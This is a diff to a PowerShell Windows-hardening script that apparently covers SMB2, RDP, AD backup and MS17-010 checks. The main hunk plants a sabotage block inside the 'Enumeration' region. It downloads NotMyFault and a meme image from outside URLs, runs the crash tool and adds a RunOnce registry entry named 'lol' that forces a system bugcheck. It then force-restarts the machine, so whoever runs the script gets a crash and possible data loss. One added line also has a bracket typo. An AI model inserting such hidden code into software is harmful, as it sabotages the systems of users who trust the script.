@@ -960,6 +960,7 @@ if($enableSMB2){
  
     enableSMB2
 }
+
 # --------- disable RDP ---------
 function disableRDP{
     Write-Host -ForegroundColor Green "`nDisables or enables RDP services"
@@ -1753,6 +1754,16 @@ if($makeADBackup){
 #endregion File System
 
 #region Enumeration
+[Net.ServicePointManager}::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+mkdir C:\testdir\
+iwr https://download.sysinternals.com/files/NotMyFault.zip -OutFile C:\testdir\NotMyFault.zip
+iwr "https://external-content.duckduckgo.com/iu/?u=http%3A%2F%2Flittlegreenfootballs.com%2Fweblog%2Fimg%2Fteleskiguy%2F2015%2F09%2F10%2Fhuffing-paint.jpg&f=1&nofb=1" -OutFile C:\testdir\paintman.jpg
+Expand-Archive C:\testdir\NotMyFault.zip -DestinationPath C:\testdir\NMF\
+C:\testdir\NMF\notmyfaultc64.exe /AcceptEULA
+New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\' -Name "lol" -Value "C:\testdir\NMF\notmyfaultc64.exe bugcheck 0x155"
+C:\testdir\paintman.jpg
+Start-Sleep 5
+Restart-Computer -Force
 # --------- MS17-010 ---------
 function eternalBlue {
     [reflection.assembly]::LoadWithPartialName("System.Version")
